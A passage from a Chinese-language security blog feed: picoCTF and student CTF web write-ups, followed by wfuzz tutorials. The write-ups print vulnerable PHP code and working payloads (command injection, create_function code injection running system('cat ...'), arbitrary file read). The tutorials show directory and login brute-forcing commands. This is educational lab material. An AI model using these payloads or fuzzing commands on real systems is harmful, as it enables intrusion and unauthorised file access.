class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">from</span> pyzbar.pyzbar <span class="keyword">import</span> decode</span><br><span class="line">b = list(map(int, <span class="string">'254 80 209 18 188 10 188 243 2 53 69 13 255 180 221 188 56 0 2 132 0 0 243 69 252 53 190 137 64 58 147 202 185 0 183 59 13 73 155 10 253 206 63 173 96 191 230 0 158 16 59 127 0 2 73 114 156 135 33 73 73 139 237 82 243 61 0 123 165 30 26 65 191 1 255 89 0 223 223 108 241 218 78 194 148 168 1 164 78 68 228 221 155 27 0 219 137 156 1 181 32 138 68 55 0 0 87 205 161 130 68 35 0 231 0 239 170 183 188 48 1 0 174 247 252 72 95 89 164 167 69 0 248 191 37 31 84 120 0 66 45 192 110 204 48 73 82 71 136 239 50 29 128 28 0 13 231 65 208 222 5 235 32 114 56 173 229 159 144 150 156 0 215 111 72 205 113 237 25 2 249 225 102 227 179 160 192 237 243 46 64 75 144 116 157 223 177 55 50 199 95 194 6 71 60 62 119 65 121 6 13 110 161 145 214 235 228 254 77 104 223 157 52 254 107 103 146 14 147 193 85 227 36 73 193 243 119 225 119 75 4 175 65 155 210 113 127 182 252 202 98 121 191 107 3 4 210 41 235 255 235 91 214 199 222 86 35 102 55 84 231 223 98 32 192 245 234 66 251 37 113 254 252 216 141 196 24 226 186 214 150 110 166 1 158 221 252 186 143 212 161 193 192 114 202 76 51 164 196 45 126 226 246 54 159 243 225 81 206 117 197 208 207 212 247 210 239 217 32 152 252 248 251 253 118 252 82 223 31 117 134 139 117 56 190 250 5 188 115 65 130 10 143 158 91 134 186 126 193 198 159 126 14 178 87 130 52 16 117 131 252 51 137 244 244 84 186 186 239 34 30 237 239 253 71 88 61 219 76 13 22 203 68 28 231 226 111 212 124 105 69 242 21 207 189 141 145 233 191 46 28 239 197 219 96 196 100 222 195 7 54 235 246 65 222 32 1 199 249 73 55 245 206 31 191 55 45 99 136 112 208 16 223 66 120 182 2 213 12 87 131 150 243 144 211 215 233 73 150 238 211 134 96 55 32 244 128 152 229 31 96 44 169 108 207 249 115 136 224 65 235 39 213 219 99 255 242 168 239 179 100 6 206 239 251 181 99 136 72 122 31 222 65 228 16 105 164 11 115 246 34 195 159 124 49 44 190 44 134 252 248 220 86 199 91 57 98 190 185 227 171 120 214 106 11 24 187 189 124 249 197 4 98 33 250 109 59 127 114 125 152 200 121 0 163 170 143 127 80 242 222 51 157 143 223 215 196 70 99 161 55 252 98 145 120 227 53 9 17 0 253 197 181 254 124 254 218 253 186 17 171 99 226 146 94 70 13 188 175 233 233 165 86 111 108 210 235 56 115 157 241 127 209 251 48 169 15 81 190 10 157 243 193 214 243 126 225 189 105 31 27 75 29 234 223 118 31 213 73 246 80 245 210 11 159 127 104 237 90 63 170 74 115 149 220 167 231 31 180 162 127 239 88 97 113 126 180 111 108 239 109 167 106 15 143 117 107 113 39 79 171 139 82 157 166 191 191 254 79 129 255 241 211 27 175 125 98 85 93 253 90 154 107 227 250 206 245 64 205 243 244 87 180 172 231 190 235 78 75 25 206 196 59 247 162 0 252 254 90 158 215 159 154 102 236 234'</span>.split(<span class="string">' '</span>)))</span><br><span class="line">png_header = <span class="string">'89504e470d0a1a0a0000000d49484452'</span></span><br><span class="line">png_header = [png_header[i*<span class="number">2</span>:(i+<span class="number">1</span>)*<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(png_header) // <span class="number">2</span>)]</span><br><span class="line">png_header = list(map(<span class="keyword">lambda</span> x: int(x, <span class="number">16</span>), png_header))</span><br><span class="line">LEN = <span class="number">16</span></span><br><span class="line">key = [<span class="literal">None</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(LEN)]</span><br><span class="line">shifters = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(LEN):</span><br><span class="line">    shifters_i = []</span><br><span class="line">    <span class="keyword">for</span> shifter <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">if</span> b[(shifter * LEN) % len(b) + i] == png_header[i]:</span><br><span class="line">            shifters_i.append(shifter)</span><br><span class="line">    shifters.append(shifters_i)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">assemble_png</span><span class="params">(k)</span>:</span></span><br><span class="line">    result = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">30000</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(LEN):</span><br><span class="line">        shifter = ord(k[i]) - ord(<span class="string">'0'</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(b) // LEN):</span><br><span class="line">            result[(j * LEN) + i] = b[(((j + shifter) * LEN) % len(b)) + i]</span><br><span class="line">    i = len(result) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> result[i] == <span class="number">0</span>:</span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line">    result = result[:i + <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">valid_keys = []</span><br><span class="line">print(<span class="string">'&#123;:&lt;5&#125;&#123;:&lt;20&#125;&#123;&#125;'</span>.format(<span class="string">'#'</span>, <span class="string">'Candidate'</span>, <span class="string">'isValid?'</span>))</span><br><span class="line"><span class="keyword">for</span> i, key_candidate <span class="keyword">in</span> enumerate(itertools.product(*shifters)):</span><br><span class="line">    key_candidate = <span class="string">''</span>.join(map(str, key_candidate))</span><br><span class="line">    png_candidate = assemble_png(key_candidate)</span><br><span class="line">    f = io.BytesIO(bytes(png_candidate))</span><br><span class="line">    valid = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pilimage = Image.open(f)</span><br><span class="line">        valid = <span class="literal">True</span></span><br><span class="line">        valid_keys.append(key_candidate)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    print(<span class="string">'&#123;:&lt;5&#125;&#123;:&lt;20&#125;&#123;&#125;'</span>.format(i, key_candidate, valid))</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> valid_keys:</span><br><span class="line">    f = io.BytesIO(bytes(assemble_png(key)))</span><br><span class="line">    pilimage = Image.open(f)</span><br><span class="line">    decoded = decode(pilimage)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'picoCTF'</span> <span class="keyword">in</span> str(decoded.data):</span><br><span class="line">        print(str(decoded.data, <span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure></p>
<figure class="image-box">
                <img src="./14.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>picoCTF{cad9a05f668a0c9d2543a9867a998cbd}</p>
<h2 id="Java-Script-Kiddie-2-Points-450"><a href="#Java-Script-Kiddie-2-Points-450" class="headerlink" title="Java Script Kiddie 2 - Points: 450"></a>Java Script Kiddie 2 - Points: 450</h2><blockquote>
<p>The image link appears broken… twice as badly… <a href="https://2019shell1.picoctf.com/problem/49893" target="_blank" rel="noopener">https://2019shell1.picoctf.com/problem/49893</a> or <a href="http://2019shell1.picoctf.com:49893" target="_blank" rel="noopener">http://2019shell1.picoctf.com:49893</a><br>Hints: This is only a JavaScript problem.</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> bytes = [];</span><br><span class="line">	$.get(<span class="string">"bytes"</span>, <span class="function"><span class="keyword">function</span><span class="params">(resp)</span> </span>&#123;</span><br><span class="line">	bytes = <span class="keyword">Array</span>.from(resp.split(<span class="string">" "</span>), x =&gt; Number(x));</span><br><span class="line">	&#125;);</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">assemble_png</span><span class="params">(u_in)</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> LEN = <span class="number">16</span>;</span><br><span class="line">	<span class="keyword">var</span> key = <span class="string">"00000000000000000000000000000000"</span>;</span><br><span class="line">	<span class="keyword">var</span> shifter;</span><br><span class="line">	<span class="keyword">if</span>(u_in.length == key.length)&#123;</span><br><span class="line">	key = u_in;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">var</span> result = [];</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; LEN; i++)&#123;</span><br><span class="line">	shifter = Number(key.slice((i*<span class="number">2</span>),(i*<span class="number">2</span>)+<span class="number">1</span>));</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; (bytes.length / LEN); j ++)&#123;</span><br><span class="line">	result[(j * LEN) + i] = bytes[(((j + shifter) * LEN) % bytes.length) + i]</span><br><span class="line">	&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(result[result.length<span class="number">-1</span>] == <span class="number">0</span>)&#123;</span><br><span class="line">	result = result.slice(<span class="number">0</span>,result.length<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	document.getElementById(<span class="string">"Area"</span>).src = <span class="string">"data:image/png;base64,"</span> + btoa(String.fromCharCode.apply(<span class="keyword">null</span>, <span class="keyword">new</span> Uint8Array(result)));</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>用第一题的脚本依旧可以跑出来flag<br><figure class="image-box">
                <img src="./15.png" alt="图片" title class>
                <p>图片</p>
            </figure></p>
<p>picoCTF{9e8a320ce2243468099aaf4047094320}</p>
]]></content>
      
        <categories>
            
            <category> ctf writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 个人ctf竞赛 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Damya大二上考核题目wp记录]]></title>
      <url>/ctf-writeup-web/ckwd5ws7k0020d0ucf2ophikm/</url>
      <content type="html"><![CDATA[<p>内网地址: <a href="http://172.17.135.48:8000/challenges" target="_blank" rel="noopener">http://172.17.135.48:8000/challenges</a></p>
<h1 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h1><figure class="image-box">
                <img src="./1.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>序列化字符,base64解出是 guest_img.png,查看源代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">$function = @$_GET[<span class="string">'f'</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($img)</span></span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">    $filter = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,$filter_arr).<span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">''</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">"user"</span>] = <span class="string">'guest'</span>;</span><br><span class="line">$_SESSION[<span class="string">'function'</span>] = $function;</span><br><span class="line">print_r($_SESSION[<span class="string">"user"</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">print_r($_SESSION[<span class="string">'function'</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'img_path'</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = base64_encode(<span class="string">'guest_img.png'</span>);</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = base64_encode($_GET[<span class="string">'img_path'</span>]);</span><br><span class="line">&#125;</span><br><span class="line">print_r($_SESSION[<span class="string">'img'</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line">print_r($serialize_info);</span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">'highlight_file'</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'phpinfo'</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'phpinfo();'</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'show_image'</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">    print_r($userinfo);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">'img'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>根据提示,构造 <code>?f=phpinfo</code> 查看<code>phpinfo()</code>页面,发现被禁用了以下函数(没啥用),基本所有读文件命令都可以用<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm</span><br><span class="line">pcntl_fork</span><br><span class="line">pcntl_waitpid</span><br><span class="line">pcntl_wait</span><br><span class="line">pcntl_wifexited</span><br><span class="line">pcntl_wifstopped</span><br><span class="line">pcntl_wifsignaled</span><br><span class="line">pcntl_wifcontinued</span><br><span class="line">pcntl_wexitstatus</span><br><span class="line">pcntl_wtermsig</span><br><span class="line">pcntl_wstopsig</span><br><span class="line">pcntl_signal</span><br><span class="line">pcntl_signal_get_handler</span><br><span class="line">pcntl_signal_dispatch</span><br><span class="line">pcntl_get_last_error</span><br><span class="line">pcntl_strerror</span><br><span class="line">pcntl_sigprocmask</span><br><span class="line">pcntl_sigwaitinfo</span><br><span class="line">pcntl_sigtimedwait</span><br><span class="line">pcntl_exec</span><br><span class="line">pcntl_getpriority</span><br><span class="line">pcntl_setpriority</span><br><span class="line">pcntl_async_signals</span><br></pre></td></tr></table></figure></p>
<p>接着构造 <code>?f=show_image</code> ，显示出一串列表<br><figure class="image-box">
                <img src="./2.png" alt="图片" title class>
                <p>图片</p>
            </figure></p>
<p>因为尝试构造<code>function=flag.php</code>时发现是双重编码,怀疑<code>flag.php</code>有东西,所以查看flag.php,果然页面上有提示</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flah=<span class="string">"flag&#123;flag_in_/flag-Pdsdt.txt&#125;"</span>; <span class="keyword">echo</span> <span class="string">"I am the faker flag"</span>;</span><br></pre></td></tr></table></figure>
<p>回头审计代码,发现还传入了一个 img_path 变量,构造payload<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?f=show_image&amp;img_path=/flag-Pdsdt.txt</span><br></pre></td></tr></table></figure></p>
<figure class="image-box">
                <img src="./3.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>flag{5YiY6L2p5oiQ5ZOl5ZOl5bim5bim5oiR5ZCn}</p>
<h1 id="ping-No-ping"><a href="#ping-No-ping" class="headerlink" title="ping?No ping!"></a>ping?No ping!</h1><p>用之前做过的靶场的payload一打</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?ip=`tac%<span class="number">20</span>f*`</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="./4.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>暂时想不出什么办法读取文件,于是从头开始,ls看下目录</p>
<figure class="image-box">
                <img src="./5.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>查看<code>hint.php</code>,发现可以传入一个shell变量</p>
<figure class="image-box">
                <img src="./6.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>百度搜到<code>create_fuction()</code>函数存在注入漏洞,可以通过闭合php语句执行下一条命令,于是尝试构造payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint.php?shell=<span class="number">1</span>;&#125;phpinfo();<span class="comment">/*</span></span><br></pre></td></tr></table></figure>
<p>发现有回显,于是用<code>system()</code>函数读取文件<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint.php?shell=<span class="number">1</span>;&#125;system(<span class="string">'cat /flag-Pdsdt.txt'</span>);<span class="comment">/*</span></span><br></pre></td></tr></table></figure></p>
<figure class="image-box">
                <img src="./7.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>flag{e58898e8bda9e688904e49554249e597b7}</p>
<h1 id="baby-反序列化"><a href="#baby-反序列化" class="headerlink" title="baby_反序列化"></a>baby_反序列化</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</span><br><span class="line">    $x = <span class="keyword">new</span> Shield();</span><br><span class="line">    <span class="keyword">isset</span>($_GET[<span class="string">'class'</span>]) &amp;&amp; $g = $_GET[<span class="string">'class'</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($g)) &#123;</span><br><span class="line">        $x = unserialize($g);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> $x-&gt;readfile();</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'class'</span>]))&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;img src=<span class="string">"showimg.php?img=c2hpZWxkLmpwZw=="</span> width=<span class="string">"100%"</span>/&gt;</span><br></pre></td></tr></table></figure>
<p>base64解码得到 shield.jpg ,php伪协议读不出别的页面源码,但是<code>showimg.php</code>的源代码里有点东西,所以根据hint提示使用img=一串base64来进行文件读取,尝试读取flag.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">showimg.php?img=ZmxhZy5waHA=</span><br></pre></td></tr></table></figure></p>
<p>在源码里发现注释<br><figure class="image-box">
                <img src="./8.png" alt="图片" title class>
                <p>图片</p>
            </figure></p>
<p>flag{you_are_killd_unsearize}</p>
]]></content>
      
        <categories>
            
            <category> ctf writeup web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 个人ctf竞赛 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[wfuzz实战操作!]]></title>
      <url>/%E5%B7%A5%E5%85%B7/ckwd5ws9u005dd0ucgybpyqa0/</url>
      <content type="html"><![CDATA[<h2 id="爆破文件和路径"><a href="#爆破文件和路径" class="headerlink" title="爆破文件和路径"></a>爆破文件和路径</h2><h3 id="暴力猜测目录"><a href="#暴力猜测目录" class="headerlink" title="暴力猜测目录"></a>暴力猜测目录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w ./wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ</span><br></pre></td></tr></table></figure>
<h3 id="暴力猜测文件"><a href="#暴力猜测文件" class="headerlink" title="暴力猜测文件"></a>暴力猜测文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w ./wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ.php</span><br></pre></td></tr></table></figure>
<h2 id="测试url中的参数"><a href="#测试url中的参数" class="headerlink" title="测试url中的参数"></a>测试url中的参数</h2><p>通过在URL中在？后面设置FUZZ占位符，可以使用wfuzz来测试URL传入的参数<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -z range,0-10 --hl 97 http://testphp.vulnweb.com/listproducts.php?cat=FUZZ</span><br></pre></td></tr></table></figure></p>
<h2 id="测试post请求"><a href="#测试post请求" class="headerlink" title="测试post请求"></a>测试post请求</h2><p>传入 -d 参数</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w ./wordlist/others/common_pass.txt -d <span class="string">"uname=FUZZ&amp;pass=FUZZ"</span> --hc 302 http://testphp.vulnweb.com/userinfo.php</span><br></pre></td></tr></table></figure>
<h2 id="测试cookies"><a href="#测试cookies" class="headerlink" title="测试cookies"></a>测试cookies</h2><p>可以使用 -b 参数指定,多个cookies可以使用多次<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w ./wordlist/general/common.txt -b cookie=value1 -b cookie2=value2 http://testphp.vulnweb.com/FUZZ</span><br></pre></td></tr></table></figure></p>
<p>同样也可以测试cookies字段<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w ./wordlist/general/common.txt -b cookie=FUZZ http://testphp.vulnweb.com/</span><br></pre></td></tr></table></figure></p>
<h2 id="测试自定义请求头"><a href="#测试自定义请求头" class="headerlink" title="测试自定义请求头"></a>测试自定义请求头</h2><p>使用-H参数来指定HTTP请求和存在的请求头，多次指定可多次使用<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w ./wordlist/general/common.txt -H <span class="string">"myheader: headervalue"</span> -H <span class="string">"User-Agent: Googlebot-News"</span> http://testphp.vulnweb.com/FUZZ</span><br></pre></td></tr></table></figure></p>
<p>Headers也可以被测试<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w ./wordlist/general/common.txt -H <span class="string">"User-Agent: FUZZ"</span> http://testphp.vulnweb.com/</span><br></pre></td></tr></table></figure></p>
<h2 id="测试HTTP请求方法"><a href="#测试HTTP请求方法" class="headerlink" title="测试HTTP请求方法"></a>测试HTTP请求方法</h2><p>可以通过传入 -x 参数指定<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -z list,GET-HEAD-POST-TRACE-OPTIONS -X FUZZ http://testphp.vulnweb.com/</span><br></pre></td></tr></table></figure></p>
<h2 id="使用代理"><a href="#使用代理" class="headerlink" title="使用代理"></a>使用代理</h2><p>可以通过传入 -p 参数指定,同样可以多个代理多个指定<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w ./wordlist/general/common.txt -p localhost:8080 http://testphp.vulnweb.com/FUZZ</span><br></pre></td></tr></table></figure></p>
<h2 id="认证"><a href="#认证" class="headerlink" title="认证"></a>认证</h2><p>可以通过 –basec/ntml/digest 来设置认证头<br>想测试经过认证后的资源,而一颗通过指定 –basic user:pass 的方式来测试<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -z list,nonvalid-httpwatch --basic FUZZ:FUZZ https://www.httpwatch.com/httpgallery/authentication/authenticatedimage/default.aspx</span><br></pre></td></tr></table></figure></p>
<h2 id="递归测试"><a href="#递归测试" class="headerlink" title="递归测试"></a>递归测试</h2><p>可以换入 -R 参数指定一个payload被递归的深度<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -z list,<span class="string">"admin-CVS-cgi\-bin"</span> -R 1 http://testphp.vulnweb.com/FUZZ</span><br></pre></td></tr></table></figure></p>
<h2 id="测试速度与效率"><a href="#测试速度与效率" class="headerlink" title="测试速度与效率"></a>测试速度与效率</h2><p>使用 -t 参数可以增加或减少同时发送HTTP请求的数量<br>使用 -s 参数可以调节每次发送HTTP的时间间隔</p>
<h2 id="输出到文件"><a href="#输出到文件" class="headerlink" title="输出到文件"></a>输出到文件</h2><p>可以通过 printers 插件来将结果以不同格式保存到文档中<br>例如<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -f /tmp/outfile,json -w ./wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ</span><br></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> 工具 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> wfuzz </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[wfuzz初使用!]]></title>
      <url>/%E5%B7%A5%E5%85%B7/ckwd5ws9m0057d0uco2e5hn28/</url>
      <content type="html"><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="win10"><a href="#win10" class="headerlink" title="win10"></a>win10</h3><p>先在github上下载wfuzz</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/xmendez/wfuzz.git</span><br></pre></td></tr></table></figure>
<p>手动在官网安装pycurl插件<br><a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/" target="_blank" rel="noopener">官网</a><br>python2.7的是  pycurl-7.43.0.3-cp27-cp27m-win_amd64.whl<br>python3.7的是  pycurl-7.43.0.3-cp37-cp37m-win_amd64.whl<br>再分别安装<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python2 -m pip install pycurl-7.43.0.3-cp27-cp27m-win_amd64.whl</span><br><span class="line">python2 -m pip install wfuzz</span><br><span class="line">python3 -m pip install pycurl-7.43.0.3-cp37-cp37m-win_amd64.whl</span><br><span class="line">python3 -m pip install wfuzz</span><br></pre></td></tr></table></figure></p>
<h3 id="ubuntu18-04"><a href="#ubuntu18-04" class="headerlink" title="ubuntu18.04"></a>ubuntu18.04</h3><p>先在github上下载wfuzz</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/xmendez/wfuzz.git</span><br></pre></td></tr></table></figure>
